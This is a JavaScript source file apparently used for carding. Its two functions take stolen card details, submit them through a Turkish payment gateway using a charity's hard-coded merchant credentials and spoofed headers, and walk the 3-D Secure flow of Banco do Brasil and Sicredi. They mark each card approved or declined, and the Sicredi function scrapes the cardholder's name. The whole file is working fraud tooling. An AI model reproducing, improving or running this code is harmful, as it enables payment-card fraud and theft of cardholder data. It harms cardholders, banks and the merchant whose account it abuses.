import got from "got";
import { load } from "cheerio";
import { CookieJar } from "tough-cookie";

export async function checker_bb(card_params) {
    if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
    }
    if (card_params.substring(0, 1) == '4') {
        var c_url = 'www58.bb.com.br';
        var secureUrl = 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin';
    }
    if (card_params.substring(0, 1) == '5') {
        var c_url = 'www66.bb.com.br';
        var secureUrl = 'https://www66.bb.com.br/SecureCodeAuth/scdLogin';
    }

    //split with multiple separators -> |,.:;/
    const split_card = card_params.split(/[\s|,.:;/]+/);

    const cookieJar = new CookieJar();
    const client = got.extend({ cookieJar });

    try {
        const req = await got.post('https://sanalposprov.garanti.com.tr/servlet/gt3dengine', {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'pt-BR,pt;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'sanalposprov.garanti.com.tr',
                'Origin': 'https://dmdturkiye.org',
                'Referer': 'https://dmdturkiye.org/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
            },
            body: `_token=J4VWHiyyj8gggTkWqNPJZXR9E3YZUIu1xnJeIl1C&secure3dsecuritylevel=3D&cardnumber=${split_card[0]}&cardexpiredatemonth=${split_card[1]}&cardexpiredateyear=${split_card[2].substring(2)}&cardcvv2=${split_card[3]}&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVAUT&terminaluserid=385824&terminalmerchantid=1153096&txntype=sales&txnamount=2000&txncurrencycode=949&txninstallmentcount=&orderid=DMD126516&terminalid=10204558&successurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&errorurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&customeremailaddress=maosns883%40gmail.com&customeripaddress=138.118.222.137&secure3dhash=0A107BA48988CCDA314534AAB475402D6C79F7D8`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html = load(req);
        const value_pareq = html('[name="PaReq"]').attr('value');
        const value_md = html('[name="MD"]').attr('value');
        const value_termurl = html('[name="TermUrl"]').attr('value');

        if (value_pareq == undefined || value_md == undefined || value_termurl == undefined) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_two = await client.post(`${secureUrl}/inicio.bb`, {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'pt-BR,pt;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'www58.bb.com.br',
                'Origin': `https://${c_url}`,
                'Referer': `${secureUrl}/auth.bb`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
            },
            body: `_charset_=UTF-8&TermUrl=${encodeURIComponent(value_termurl)}&PaReq=${encodeURIComponent(value_pareq)}&MD=${encodeURIComponent(value_md)}`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });
        if (req_two.includes('Abra o aplicativo do BB em seu smartphone') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ QR-CODE</font>`;
        }
        if (req_two.includes('Ocorreu um erro durante o processamento de sua') == true) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ authentication error</font>`;
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
        }
    } catch (error) {
        if (error.code == 'ERR_NON_2XX_3XX_RESPONSE') {
            const req_tree = await client(error.options.url, {
                https: {
                    rejectUnauthorized: false
                }
            });
            const req_for = await client(`${secureUrl}/customer.bb`, {
                responseType: 'text',
                https: {
                    rejectUnauthorized: false
                },
                resolveBodyOnly: true
            });
            if (req_for.includes('Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute') == true) {
                return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ CLEAN 3ds</font>`;
            }
            if (req_for.includes('Selecione um celular para receber') == true) {
                return `<font style="color: green;">#Aprovada ${card_params} ➜ auth 3ds ➜ SMS</font>`;
            } else {
                return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
            }
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ API ➜ request failed</font>`;
        }
    }
}

export async function checker_sicredi(card_params) {
    if (card_params.substring(0, 1) != '4' && card_params.substring(0, 1) != '5') {
        return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ incompatible card</font>`;
    }
    if (card_params.substring(0, 1) == '4') {
        var c_url = 'verifiedbyvisa.secureacs.com';
    }
    if (card_params.substring(0, 1) == '5') {
        var c_url = 'mastercardsecurecode.secureacs.com';
    }

    //split with multiple separators -> |,.:;/
    const split_card = card_params.split(/[\s|,.:;/]+/);

    const cookieJar = new CookieJar();
    const client = got.extend({ cookieJar });

    try {
        const req = await got.post('https://sanalposprov.garanti.com.tr/servlet/gt3dengine', {
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'pt-BR,pt;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'sanalposprov.garanti.com.tr',
                'Origin': 'https://dmdturkiye.org',
                'Referer': 'https://dmdturkiye.org/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
            },
            body: `_token=J4VWHiyyj8gggTkWqNPJZXR9E3YZUIu1xnJeIl1C&secure3dsecuritylevel=3D&cardnumber=${split_card[0]}&cardexpiredatemonth=${split_card[1]}&cardexpiredateyear=${split_card[2].substring(2)}&cardcvv2=${split_card[3]}&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVAUT&terminaluserid=385824&terminalmerchantid=1153096&txntype=sales&txnamount=2000&txncurrencycode=949&txninstallmentcount=&orderid=DMD126516&terminalid=10204558&successurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&errorurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&customeremailaddress=maosns883%40gmail.com&customeripaddress=138.118.222.137&secure3dhash=0A107BA48988CCDA314534AAB475402D6C79F7D8`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html = load(req);
        const value_url = html('[name="red2ACSv1"]').attr('action');
        const value_pareq = html('[name="PaReq"]').attr('value');
        const value_md = html('[name="MD"]').attr('value');
        const value_termurl = html('[name="TermUrl"]').attr('value');

        if (value_pareq == undefined || value_md == undefined || value_termurl == undefined) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_two = await client.post(value_url, {
            headers: {
                'Host': c_url,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.gov.org.tr',
                'Connection': 'keep-alive',
                'Referer': 'https://www.gov.org.tr/'
            },
            body: `PaReq=${encodeURIComponent(value_pareq)}&TermUrl=${encodeURIComponent(value_termurl)}&MD=${encodeURIComponent(value_md)}`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html2 = load(req_two);
        const redirect = html2('[name="redirectForm"]').attr('action');
        const IdSession = html2('[name="IdSession"]').attr('value');
        const UrlReturn = html2('[name="UrlReturn"]').attr('value');
        const TokenWeb = html2('[name="TokenWeb"]').attr('value');
        const TokenWebReturn = html2('[name="TokenWebReturn"]').attr('value');

        if (IdSession == undefined || UrlReturn == undefined || TokenWeb == undefined || TokenWebReturn == undefined) {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
        }

        const req_tree = await client.post(redirect, {
            headers: {
                'Host': c_url,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': `https://${c_url}`,
                'Connection': 'keep-alive',
                'Referer': `https://${c_url}/AcsPreAuthenticationWEB/PreAuthenticationServlet`,
            },
            body: `IdSession=${encodeURIComponent(IdSession)}&UrlReturn=${encodeURIComponent(UrlReturn)}&TokenWeb=${encodeURIComponent(TokenWeb)}&TokenWebReturn=${encodeURIComponent(TokenWebReturn)}`,
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
        });

        const req_for = await client(`https://${c_url}/AuthSystemSicrediWEB/pages/authentication.jsf`, {
            headers: {
                'Host': c_url,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
                'Referer': `https://${c_url}/AcsPreAuthenticationWEB/PreAuthenticationServlet`,
                'Connection': 'keep-alive',
            },
            https: {
                rejectUnauthorized: false
            },
            responseType: 'text',
            resolveBodyOnly: true
        });

        const html3 = load(req_for);
        const nome_client = html3('[class="hst_bank_body_1_font"]').text().split('.')[0].trim().replace('Olá ', '');

        if (JSON.stringify(req_for).includes('hst_bank_body_1_font') == true) {
            return `<font style="color: green;">#Aprovada ${card_params} ➜ ${nome_client} ➜ authorized</font>`;
        } else {
            return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ card declined</font>`;
        }
    } catch (error) {
        return `<font style="color: red;">#Reprovada ${card_params} ➜ API ➜ request failed</font>`;
    }
}